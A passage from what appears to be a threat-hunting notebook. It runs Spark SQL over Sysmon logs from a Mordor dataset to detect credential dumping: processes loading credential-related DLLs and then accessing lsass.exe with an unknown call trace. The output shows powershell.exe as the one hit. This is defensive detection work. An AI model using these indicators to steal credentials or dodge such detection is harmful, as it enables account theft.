      "cell_type": "code",
      "metadata": {
        "id": "cRKstrmwE_ha",
        "outputId": "67f0adef-2892-4c3c-a504-601225e97608"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT ProcessGuid, Image, ImageLoaded\n",
        "FROM mordorTable\n",
        "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
        "    AND EventID = 7\n",
        "    AND (\n",
        "        ImageLoaded LIKE \"%samlib.dll\"\n",
        "        OR ImageLoaded LIKE \"%vaultcli.dll\"\n",
        "        OR ImageLoaded LIKE \"%hid.dll\"\n",
        "        OR ImageLoaded LIKE \"%winscard.dll\"\n",
        "        OR ImageLoaded LIKE \"%cryptdll.dll\"\n",
        "    )\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+--------------------------------------+---------------------------------------------------------+--------------------------------+\n",
            "|ProcessGuid                           |Image                                                    |ImageLoaded                     |\n",
            "+--------------------------------------+---------------------------------------------------------+--------------------------------+\n",
            "|{297bc33e-65d0-5f2d-8207-000000000400}|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|C:\\Windows\\System32\\cryptdll.dll|\n",
            "|{297bc33e-65d0-5f2d-8207-000000000400}|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|C:\\Windows\\System32\\samlib.dll  |\n",
            "|{297bc33e-65d0-5f2d-8207-000000000400}|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|C:\\Windows\\System32\\hid.dll     |\n",
            "|{297bc33e-65d0-5f2d-8207-000000000400}|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|C:\\Windows\\System32\\vaultcli.dll|\n",
            "+--------------------------------------+---------------------------------------------------------+--------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wdXdznglE_ha"
      },
      "source": [
        "筛选ID为7和10的sysmon事件。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "pG6CIca7E_hb",
        "outputId": "0803667a-85ea-4e76-ce61-d12820c55639"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT a.`@timestamp`, a.Hostname, m.Image, m.hits\n",
        "FROM mordorTable a\n",
        "INNER JOIN (\n",
        "    SELECT ProcessGuid, Image, COUNT(DISTINCT ImageLoaded) AS hits\n",
        "    FROM mordorTable\n",
        "    WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
        "        AND EventID = 7\n",
        "        AND ( \n",
        "            ImageLoaded LIKE \"%samlib.dll\"\n",
        "            OR ImageLoaded LIKE \"%vaultcli.dll\"\n",
        "            OR ImageLoaded LIKE \"%hid.dll\"\n",
        "            OR ImageLoaded LIKE \"%winscard.dll\"\n",
        "            OR ImageLoaded LIKE \"%cryptdll.dll\"\n",
        "        )\n",
        "        GROUP BY ProcessGuid,Image ORDER BY hits DESC LIMIT 10\n",
        "    ) m\n",
        "ON a.SourceProcessGUID = m.ProcessGuid\n",
        "WHERE a.Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
        "    AND a.EventID = 10\n",
        "    AND a.TargetImage LIKE \"%lsass.exe\"\n",
        "    AND a.CallTrace LIKE \"%UNKNOWN%\"\n",
        "    AND m.hits >= 3\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+---------------------------+---------------------------------------------------------+----+\n",
            "|@timestamp              |Hostname                   |Image                                                    |hits|\n",
            "+------------------------+---------------------------+---------------------------------------------------------+----+\n",
            "|2020-08-07T14:32:57.589Z|WORKSTATION5.theshire.local|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|4   |\n",
            "+------------------------+---------------------------+---------------------------------------------------------+----+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}